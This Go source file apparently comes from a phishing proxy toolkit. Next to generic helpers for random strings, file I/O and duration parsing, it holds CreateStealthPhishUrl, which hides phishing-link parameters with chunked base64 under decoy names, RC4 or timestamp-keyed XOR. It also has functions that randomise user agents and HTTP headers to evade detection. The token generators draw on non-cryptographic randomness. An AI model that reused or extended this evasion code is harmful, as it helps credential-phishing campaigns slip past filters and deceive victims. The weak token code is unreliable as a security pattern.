package core

import (
	cryptoRand "crypto/rand"
	"crypto/rc4"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/fs"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

func GenRandomToken() string {
	rdata := make([]byte, 64)
	rand.Read(rdata)
	hash := sha256.Sum256(rdata)
	token := fmt.Sprintf("%x", hash)
	return token
}

func GenRandomString(n int) string {
	const lb = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, n)
	for i := range b {
		t := make([]byte, 1)
		cryptoRand.Read(t)
		b[i] = lb[int(t[0])%len(lb)]
	}
	return string(b)
}

func GenRandomAlphanumString(n int) string {
	const lb = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		t := make([]byte, 1)
		rand.Read(t)
		b[i] = lb[int(t[0])%len(lb)]
	}
	return string(b)
}

func CreateDir(path string, perm os.FileMode) error {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		err = os.Mkdir(path, perm)
		if err != nil {
			return err
		}
	}
	return nil
}

func ReadFromFile(path string) ([]byte, error) {
	f, err := os.OpenFile(path, os.O_RDONLY, 0644)
	defer f.Close()
	if err != nil {
		return nil, err
	}
	b, err := ioutil.ReadAll(f)
	if err != nil {
		return nil, err
	}
	return b, nil
}

func SaveToFile(b []byte, fpath string, perm fs.FileMode) error {
	file, err := os.OpenFile(fpath, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, perm)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.Write(b)
	if err != nil {
		return err
	}
	return nil
}

func ParseDurationString(s string) (t_dur time.Duration, err error) {
	const DURATION_TYPES = "dhms"

	t_dur = 0
	err = nil

	var days, hours, minutes, seconds int64
	var last_type_index int = -1
	var s_num string
	for _, c := range s {
		if c >= '0' && c <= '9' {
			s_num += string(c)
		} else {
			if len(s_num) > 0 {
				m_index := strings.Index(DURATION_TYPES, string(c))
				if m_index >= 0 {
					if m_index > last_type_index {
						last_type_index = m_index
						var val int64
						val, err = strconv.ParseInt(s_num, 10, 0)
						if err != nil {
							return
						}
						switch c {
						case 'd':
							days = val
						case 'h':
							hours = val
						case 'm':
							minutes = val
						case 's':
							seconds = val
						}
					} else {
						err = fmt.Errorf("you can only use time duration types in following order: 'd' > 'h' > 'm' > 's'")
						return
					}
				} else {
					err = fmt.Errorf("unknown time duration type: '%s', you can use only 'd', 'h', 'm' or 's'", string(c))
					return
				}
			} else {
				err = fmt.Errorf("time duration value needs to start with a number")
				return
			}
			s_num = ""
		}
	}
	t_dur = time.Duration(days)*24*time.Hour + time.Duration(hours)*time.Hour + time.Duration(minutes)*time.Minute + time.Duration(seconds)*time.Second
	return
}

func GetDurationString(t_now time.Time, t_expire time.Time) (ret string) {
	var days, hours, minutes, seconds int64
	ret = ""

	if t_expire.After(t_now) {
		t_dur := t_expire.Sub(t_now)
		if t_dur > 0 {
			days = int64(t_dur / (24 * time.Hour))
			t_dur -= time.Duration(days) * (24 * time.Hour)

			hours = int64(t_dur / time.Hour)
			t_dur -= time.Duration(hours) * time.Hour

			minutes = int64(t_dur / time.Minute)
			t_dur -= time.Duration(minutes) * time.Minute

			seconds = int64(t_dur / time.Second)

			var forcePrint bool = false
			if days > 0 {
				forcePrint = true
				ret += fmt.Sprintf("%dd", days)
			}
			if hours > 0 || forcePrint {
				forcePrint = true
				ret += fmt.Sprintf("%dh", hours)
			}
			if minutes > 0 || forcePrint {
				forcePrint = true
				ret += fmt.Sprintf("%dm", minutes)
			}
			if seconds > 0 || forcePrint {
				forcePrint = true
				ret += fmt.Sprintf("%ds", seconds)
			}
		}
	}
	return
}

// getRandomUserAgent returns a random, legitimate-looking user agent
func GetRandomUserAgent() string {
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
	}
	return userAgents[rand.Intn(len(userAgents))]
}

func (p *HttpProxy) CreateStealthPhishUrl(base_url string, params *url.Values) string {
	if len(*params) == 0 {
		return base_url
	}

	// Use different parameter encoding techniques
	technique := rand.Intn(3)

	switch technique {
	case 0:
		// Method 1: Split parameters across multiple dummy parameters
		key_arg := strings.ToLower(GenRandomString(rand.Intn(3) + 1))
		dec_params := params.Encode()

		// Split the params string into multiple parts
		chunks := []string{}
		chunkSize := 8 + rand.Intn(8)
		for i := 0; i < len(dec_params); i += chunkSize {
			end := i + chunkSize
			if end > len(dec_params) {
				end = len(dec_params)
			}
			chunks = append(chunks, dec_params[i:end])
		}

		// Create multiple parameters with the chunks
		result := base_url + "?"
		for i, chunk := range chunks {
			paramName := key_arg
			if i > 0 {
				paramName = key_arg + strconv.Itoa(i)
			}
			result += paramName + "=" + base64.URLEncoding.EncodeToString([]byte(chunk))
			if i < len(chunks)-1 {
				result += "&"
			}
		}
		return result

	case 1:
		// Method 2: Use dummy parameters with the real one hidden
		result := base_url + "?"

		// Add 1-3 dummy parameters
		dummyCount := rand.Intn(3) + 1
		for i := 0; i < dummyCount; i++ {
			dummyKey := GenRandomString(3 + rand.Intn(5))
			dummyVal := GenRandomString(5 + rand.Intn(10))
			result += dummyKey + "=" + dummyVal + "&"
		}

		// Add the real parameter with less obvious naming
		enc_key := GenRandomAlphanumString(8)
		dec_params := params.Encode()
		c, _ := rc4.NewCipher([]byte(enc_key))
		enc_params := make([]byte, len(dec_params))
		c.XORKeyStream(enc_params, []byte(dec_params))

		realParam := GenRandomString(4)
		result += realParam + "=" + enc_key + base64.RawURLEncoding.EncodeToString(enc_params)
		return result

	default:
		// Method 3: Use JSON-encoded and encrypted params with timestamp
		timestamp := strconv.FormatInt(time.Now().Unix(), 36)
		paramJson, _ := json.Marshal(*params)

		// Simple XOR with timestamp as key
		xorKey := []byte(timestamp)
		xorData := make([]byte, len(paramJson))
		for i := range paramJson {
			xorData[i] = paramJson[i] ^ xorKey[i%len(xorKey)]
		}

		encodedParams := base64.RawURLEncoding.EncodeToString(xorData)
		t := GenRandomString(4)

		return base_url + "?" + t + "=" + timestamp + "&" +
			GenRandomString(3) + "=" + encodedParams
	}
}

// randomizeHeaders adds natural variation to HTTP headers
func RandomizeHeaders(req *http.Request) {
	// Cache control with variation
	cacheValues := []string{
		"no-cache",
		"no-store, must-revalidate",
		"max-age=0, private",
	}
	req.Header.Set("Cache-Control", cacheValues[rand.Intn(len(cacheValues))])

	// Add accept-language with some variation
	languages := []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.8",
		"en-US,en;q=0.9,fr;q=0.8",
		"en-US,en;q=0.9,es;q=0.8",
	}
	if rand.Intn(100) > 30 { // 70% chance to add this header
		req.Header.Set("Accept-Language", languages[rand.Intn(len(languages))])
	}

	// Set accept header with variation
	accepts := []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	}
	req.Header.Set("Accept", accepts[rand.Intn(len(accepts))])
}
